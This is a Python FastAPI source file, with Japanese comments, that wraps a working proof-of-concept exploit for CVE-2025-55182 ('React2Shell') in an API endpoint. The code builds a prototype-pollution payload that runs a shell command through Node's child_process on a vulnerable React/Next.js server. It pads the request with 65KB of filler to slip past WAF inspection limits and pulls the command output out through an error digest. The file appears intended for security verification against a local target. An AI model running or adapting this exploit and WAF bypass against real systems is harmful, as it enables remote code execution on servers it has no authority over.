from fastapi import FastAPI
import requests
import json

app = FastAPI(
    title="Brest Security API",
    description="セキュリティを検証する機能をAPIで提供する。",
    summary="Security API by REST",
    version="0.0.1",
)

app_base_path = "/security"


@app.post(f"{app_base_path}/react2shell/id", tags=["poc"], response_model=dict)
async def get_id():
    """
    CVE-2025-55182 (React2Shell) のPoCコードを実行します。

    参考文献:
    * https://securitylabs.datadoghq.com/articles/cve-2025-55182-react2shell-remote-code-execution-react-server-components/
    * https://github.com/msanft/CVE-2025-55182
    * https://github.com/msanft/CVE-2025-55182/blob/main/poc.py
    * https://github.com/ejpir/CVE-2025-55182-research?tab=readme-ov-file
    """
    # ターゲットURLと実行コマンドを設定
    base_url = "http://localhost:8081"
    executable_command = "id"

    # ----------------------------------------------------
    # WAF回避のための設定
    # ----------------------------------------------------
    # WAFの検査制限（例: 64KB）を確実に超えるように、パディングサイズを定義します。
    # AWS WAFの制限は8KBから64KBの範囲であり、ここでは65KB (65536バイト)とします。
    # これにより、実際の攻撃ペイロードはWAFの検査窓の外に配置されることが企図されます [5], [2]。
    padding_size = 65 * 1024  # 65KB
    padding_data = "A" * padding_size

    # ----------------------------------------------------
    # チャンク 0: 悪意のあるフェイクチャンクの定義 (RCEペイロード)
    # ----------------------------------------------------
    crafted_chunk = {
        # チャンク1経由でChunk.prototype.then()を参照する (Thenable化)
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        # $B0 をトリガーするペイロード
        "value": '{"then": "$B0"}',
        "_response": {
            # 実行コマンドを注入し、Next.jsのエラーハンドリングを利用して結果を抽出
            # 脆弱性対応されたReactやNext.jsで動作するアプリに対してはタイムアウトになる。
            "_prefix": f"var res = process.mainModule.require('child_process').execSync('{executable_command}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
            # Functionコンストラクタを取得するプロトタイプ汚染パス
            "_formData": {
                "get": "$1:constructor:constructor",
            },
        },
    }

    # ----------------------------------------------------
    # マルチパートフォームデータ (files) の定義
    # ----------------------------------------------------
    files = {
        # 1. パディングフィールド: WAFの検査を消費させるために最初に配置
        "padding": (None, padding_data),
        # 2. チャンク 0: 悪意のある JSON ペイロード (検査制限を超えた後に配置)
        "0": (None, json.dumps(crafted_chunk)),
        # 3. チャンク 1: チャンク0への生（raw）の参照 (検査制限を超えた後に配置)
        "1": (None, '"$@0"'),
    }

    # ----------------------------------------------------
    # リクエストの実行
    # ----------------------------------------------------
    headers = {"Next-Action": "x"}  # Server Actionリクエストであることを示す [6]
    res = requests.post(base_url, files=files, headers=headers, timeout=10)
    print(res.status_code)
    print(res.text)

    return {
        "id": res.text,
    }
